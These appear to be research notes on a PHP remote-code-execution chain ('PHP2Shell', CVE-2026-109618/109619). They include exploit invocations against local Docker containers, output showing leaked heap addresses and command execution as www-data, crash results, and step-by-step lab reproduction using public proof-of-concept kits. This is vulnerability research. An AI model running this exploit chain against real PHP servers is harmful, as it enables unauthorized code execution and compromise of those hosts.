# research/ — CVE-proper trigger, UAF, and RCE evidence

Empirical results for the actual PHP2Shell memory-corruption paths, gathered
2026-10-23. The delivery tooling (`deliver_update.py`) exercises the
CVE-affected runtime; these notes document what the CVE itself does, with
reproduction steps.

## CVE-proper RCE — DEMONSTRATED (php:8.4.26-apache, amd64)

The vendored public chain (cve-chain/, godylockz/cve-2026-109618-php2shell)
achieves one-shot RCE against the stock vulnerable Apache image — plain
multipart HTTP against a bare `<?php echo "OK\n"; ?>` page, no app code:

```
$ python3 cve-chain/php2shell.py exploit -u http://127.0.0.1:8088/index.php
[+] chunk base = 0x7ffffc400000      # stage 1: Set-Cookie OOB heap leak
[+] libphp base = 0x7ffffe013000     # stage 2: libphp leak (ZVAL_PTR_DTOR)
[+] stage 3 attempt 1 succeeded      # forged HashTable pDestructor -> zif_system

PROOF:
uid=33(www-data) gid=33(www-data) groups=33(www-data)
172.18.0.2
8285ec5d721f
```

Two consecutive successful runs (proof_run.txt). The chain: worker rotation
(fork/COW), heap + libphp leaks read off the wire, forged
`zend_array.pDestructor = zif_system`. Requires mod_php prefork on Linux
(fork model) — see cve-chain/README.md's platform scope.

## Findings

| Path | Result on 8.1.34 |
|---|---|
| CVE-2026-109618 OOM-bailout trigger | **Fires** — `Fatal error: Allowed memory size of 4194304 bytes exhausted ... in Unknown on line 0` during request parsing (FPM, `memory_limit=4M` pool) |
| CVE-2026-109619 stale `BG(unserialize)` reuse | **Demonstrated** — producer (OOM mid-`unserialize()`) + consumer (pre-RINIT session decode) → worker **SIGSEGV** (`child 7 exited on signal 11`) |
| UAF → RCE | **Not achieved.** The crash is the UAF's observable outcome here; the forged-`zend_fcall_info` heap-grooming stage in the public kit is tuned for other builds (8.5 debug x86_64) and the author states it is "not claimed to work universally". The 8.1 upload-progress cached-zval UAF variant used by that kit does not exist in 8.1's source (8.1 caches pointers into the surviving `progress->data` array, not the freed session HashTable). |
| php -S (`php -S` cli-server) | **Cannot even arm the OOM** — the cli-server applies `post_max_size` to chunked bodies (`POST Content-Length of 218104243 bytes exceeds the limit of 8388608 bytes`), and `max_execution_time=0` removes the timeout trigger. Consistent with the advisories' affected-SAPI list (FPM/mod_php/cgi/...), which omits php -S. |

## Reproduction (FPM)

```bash
# 1. Vulnerable FPM with the PoC kit's lab limits
docker run -d --name php81-fpm -p 9001:9000 \
  -v "$(pwd)/../":/app php:8.1-fpm
docker exec php81-fpm sh -c '
  sed -i "s/^pm = dynamic/pm = static/; s/^pm.max_children = .*/pm.max_children = 1/" \
    /usr/local/etc/php-fpm.d/www.conf
  cat >> /usr/local/etc/php-fpm.d/www.conf <<EOF
php_admin_value[memory_limit] = 4M
php_admin_value[post_max_size] = 8M
php_admin_value[max_input_vars] = 1000000
php_admin_value[session.upload_progress.enabled] = 1
EOF'
docker restart php81-fpm

# 2. Lab scripts (producer.php OOMs mid-unserialize; consumer.php is the victim)
docker exec php81-fpm mkdir -p /tmp/poctest
docker cp research/lab/php81-fpm/index.php php81-fpm:/tmp/poctest/
docker cp research/lab/php81-fpm/producer.php php81-fpm:/tmp/poctest/
docker cp research/lab/php81-fpm/consumer.php php81-fpm:/tmp/poctest/

# 3. OOM-bailout trigger (CVE-2026-109618)
#    any request that exhausts the 4M limit during parsing, e.g.:
#    python3 research/poc_stale_state.py --mode oom  (see driver)

# 4. Stale-BG(unserialize) UAF (CVE-2026-109619) -> SIGSEGV
python3 research/fcgi_stale.py --host 127.0.0.1 --port 9001
docker logs php81-fpm   # expect: child ... exited on signal 11 (SIGSEGV)
```

## Attribution

Drivers are adapted from the public PoC kit joshuarosato/php2shell-poc
(Apache-2.0) — `poc_stale_state.py` multipart builder, `poc.py` OOM mode,
`fcgi_client.py` record primitives — and the lab scripts from that kit's
`lab/` directory. See the per-file headers.
